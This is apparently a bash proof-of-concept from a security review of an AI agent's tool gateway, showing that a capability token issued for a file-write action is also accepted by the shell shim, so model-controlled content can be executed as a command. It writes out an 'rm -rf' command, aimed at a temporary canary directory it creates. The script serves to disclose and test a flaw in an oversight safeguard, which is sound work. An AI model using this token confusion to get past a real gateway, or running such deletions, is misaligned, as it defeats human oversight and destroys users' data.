#!/usr/bin/env bash
# safe-10 adaptive-adversary finding: a capability token minted by the
# gateway daemon on a real ALLOW is bound ONLY to
# (decision_index, sha256(action_bytes), expiry) -- it carries NO
# indication of which TOOL/shim it was issued for. Each tool_shim_*
# binary maintains its OWN independent "consumed index" file
# (gateway/src/shim_common.rs: default_consumed_path, one file per tool
# name), so consuming a token at shim A does not invalidate it at shim B.
#
# Consequence demonstrated here: a token minted for a FILE-WRITE action
# (gateway ALLOWed writing some content bytes to a harmless output path)
# is ALSO accepted by tool_shim_shell for those SAME bytes interpreted as
# a shell command -- because tool_shim_file's action bytes are exactly
# the file content (not the path, not "file:" prefixed, nothing
# tool-specific), and tool_shim_shell's action bytes are exactly the
# command string. If those byte strings are identical (attacker/model
# controlled content, e.g. a string that is simultaneously valid file
# content and a valid shell command), the SAME token authorizes both.
#
# cap_issue_for_test uses the literal same gateway::capability::issue
# function the real gateway daemon calls on ALLOW (see that binary's own
# doc comment) -- a token from it is "indistinguishable from one a real
# daemon ALLOW would hand out". This script is therefore not a simulation
# of the vulnerable code path; it exercises the exact same code the
# daemon and both shims run in production.
#
# Run: bash cross_shim_token_confusion_poc.sh   (from this directory, or
# anywhere -- paths below are absolute-relative to $GW_DIR)
set -euo pipefail
GW_DIR="$(cd "$(dirname "$0")/../../../demo/agent-trace/gateway" && pwd)"
cd "$GW_DIR"
cargo build --release --offline --quiet

WORK=$(mktemp -d)
trap 'rm -rf "$WORK" /tmp/safe10-poc-victim-dir' EXIT
KEY="$WORK/cap.key"; head -c 32 /dev/urandom > "$KEY"
EXPIRY=$(( $(date +%s) + 300 ))
IDX=42
CONTENT="rm -rf /tmp/safe10-poc-victim-dir"
mkdir -p /tmp/safe10-poc-victim-dir
touch /tmp/safe10-poc-victim-dir/canary.txt

echo "== Minting a token EXACTLY as the daemon would on a FILE-WRITE ALLOW =="
echo "   (content to be written to some harmless log/output path: '$CONTENT')"
TOKEN=$(target/release/cap_issue_for_test "$KEY" "$IDX" "$EXPIRY" file "/tmp/harmless-output.txt" "$CONTENT")
AHASH=$(printf '%s' "$CONTENT" | sha256sum | awk '{print $1}')
echo "token=$TOKEN action-hash=$AHASH"
echo
echo "-- victim dir BEFORE --"; ls -la /tmp/safe10-poc-victim-dir
echo
echo "== Presenting the SAME token to tool_shim_shell (never issued for this shim) =="
CONSUMED_SHELL="$WORK/consumed.shell.txt"; touch "$CONSUMED_SHELL"
set +e
OUT=$(target/release/tool_shim_shell --idx "$IDX" --cap "$TOKEN" --exp "$EXPIRY" --action-hash "$AHASH" \
  --key-file "$KEY" --consumed-file "$CONSUMED_SHELL" -- $CONTENT 2>&1)
RC=$?
set -e
echo "$OUT"
echo "exit=$RC"
echo
echo "-- victim dir AFTER --"
if [ -d /tmp/safe10-poc-victim-dir ]; then
  ls -la /tmp/safe10-poc-victim-dir
  echo "RESULT: directory still exists -- shim did NOT execute (unexpected if this bug is fixed)"
else
  echo "(directory gone)"
  echo "RESULT: CONFIRMED -- a file-write-only capability token caused a real shell exec (rm -rf) via a different shim."
fi
